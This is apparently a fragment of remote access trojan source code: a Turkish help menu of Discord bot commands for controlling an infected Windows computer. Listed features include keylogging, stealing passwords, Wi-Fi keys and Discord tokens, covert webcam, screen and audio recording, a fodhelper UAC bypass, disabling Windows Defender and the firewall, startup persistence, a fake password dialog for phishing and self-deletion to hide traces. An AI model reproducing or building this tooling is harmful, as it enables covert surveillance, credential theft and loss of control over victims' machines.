...
--> !message = Metninizi gösteren bir mesaj kutusu göster / Sözdizimi = "!message örneği"
--> !shell = Bir kabuk komutu yürütün /Syntax = "!shell whoami"
--> !webcampic = Web kamerasından bir resim çekin
--> !windowstart = Geçerli kullanıcı penceresini günlüğe kaydetmeye başla (günlük, bot etkinliğinde gösterilir)
--> !windowstop = Geçerli kullanıcı penceresini günlüğe kaydetmeyi durdur
--> !voice = Bir sesin özel bir cümle dışında yüksek sesle söylemesini sağlayın / Sözdizimi = "!voice testi"
--> !admincheck = Programın yönetici ayrıcalıklarına sahip olup olmadığını kontrol edin
--> !sysinfo = Virüs bulaşmış bilgisayar hakkında bilgi verir
--> !history = Chrome tarayıcı geçmişini al
--> !download = Virüs bulaşmış bilgisayardan bir dosya indirin
--> !upload = Dosyayı virüslü bilgisayara yükleyin / Sözdizimi = "!upload file.png" (ekli)
--> !cd = Dizini değiştirir
--> !delete = bir dosyayı siler / Syntax = "!delete /path to/the/file.txt"
--> !write = Bilgisayarda istediğiniz cümleyi yazın / Bilgisayarda enter tuşuna basmak için "enter" yazın
--> !wallpaper = Etkilenen bilgisayar duvar kağıdını değiştir / Sözdizimi = "!wallpaper" (ekli)
--> !clipboard = Etkilenen bilgisayar panosu içeriğini al
--> !geolocate = google map ile ip adresinin enlem ve boylamını kullanarak bilgisayarı konumlandırın / Uyarı : IP adreslerinin coğrafi konumunu belirlemek çok kesin değil
--> !startkeylogger = Bir keylogger başlatır
--> !stopkeylogger = Keylogger'ı durdurur
--> !dumpkeylogger = Keylog'u atar
--> !volumemax = Sesi maksimuma getir
--> !volumezero = Sesi 0'a koy
--> !idletime = Kullanıcının hedef bilgisayardaki boşta kalma süresini alın
--> !listprocess = Tüm süreci al
--> !blockinput = Kullanıcının klavyesini ve faresini engeller / Uyarı : Yönetici hakları gereklidir
--> !unblockinput = Kullanıcının klavye ve faresinin engellemesini kaldırır / Uyarı : Yönetici hakları gereklidir
--> !screenshot = Kullanıcının mevcut ekranının ekran görüntüsünü alın
--> !exit = Programdan çık
--> !kill = Bir oturumu veya tüm oturumları öldür / Sözdizimi = "!kill session-3" veya "!kill all"
--> !uacbypass = fod helper'ı kullanarak admin kazanmak için uac'yi atlamaya çalışın
--> !passwords = tüm şifreleri al
--> !streamwebcam = birden fazla resim göndererek web kamerası akışını sağlar
--> !stopwebcam = web kamerası akışını durdur
--> !streamscreen = birden fazla resim göndererek akış ekranı
--> !stopscreen = ekran akışını durdur
--> !shutdown = bilgisayarı kapat
--> !restart = bilgisayarı yeniden başlat
--> !logoff = mevcut kullanıcının oturumunu kapat
--> !bluescreen = BlueScreen PC
--> !displaydir = geçerli dizindeki tüm öğeleri göster
--> !currentdir = geçerli dizini göster
--> !dateandtime = sistem tarih ve saatini göster
--> !prockill = bir işlemi isme göre sonlandır / sözdizimine göre = "!kill process.exe"
--> !recscreen = belirli bir süre ekran kaydı / sözdizimi = "!recscreen 10"
--> !reccam = belirli bir süre kamera kaydı / sözdizimi = "!reccam 10"
--> !recaudio = belirli bir süre ses kaydı / sözdizimi = "!recaudio 10"
--> !disableantivirus = Windows Defender'ı kalıcı olarak devre dışı bırakın(yönetici gerektirir)
--> !disablefirewall = Windows güvenlik duvarını devre dışı bırak (yönetici gerektirir)
--> !audio = hedef bilgisayarda bir ses dosyasını çal(sadece .wav) / Sözdizimi = "!audio" (ekli)
--> !selfdestruct = bu programın hedef bilgisayarda olduğu tüm izleri sil
--> !windowspass = bir parola iletişim kutusu açarak parolayı phishing girişiminde bulunma
--> !displayoff = monitörü kapatın(Yönetici hakları gereklidir)
--> !displayon = monitörleri aç(Yönetici hakları gereklidir)
--> !hide = niteliği gizli olarak değiştirerek dosyayı gizleyin
--> !unhide = dosyayı göster, özelliği kaldırarak dosyayı göster
--> !ejectcd = bilgisayardaki cd sürücüsünü çıkar
--> !retractcd = bilgisayardaki cd sürücüsünü geri çekin
--> !critproc = programı kritik bir süreç haline getirir. yani kapatılırsa bilgisayar mavi ekran yapar (Yönetici hakları gereklidir)
--> !uncritproc = süreç kritik bir süreçse, artık kritik bir süreç olmayacak, yani mavi tarama olmadan kapatılabilir(Yönetici hakları gereklidir)
--> !website = virüslü bilgisayarda bir web sitesi aç / sözdizimi = "!website google.com" veya "!website www.google.com"
--> !distaskmgr = görev yöneticisini devre dışı bırak(Yönetici hakları gereklidir)
--> !enbtaskmgr = görev yöneticisini etkinleştir(devre dışıysa)(Yönetici hakları gereklidir)
--> !getwifipass = mevcut cihazdaki tüm wifi şifrelerini al(Yönetici hakları gereklidir)
--> !startup = dosyayı başlatmaya ekle(bilgisayar bu dosyaya başladığında)(Yönetici hakları gereklidir)
--> !getdiscordtokens = SADECE anlaşmazlık belirteci alın! (bunların şifresini de çözer)
"""
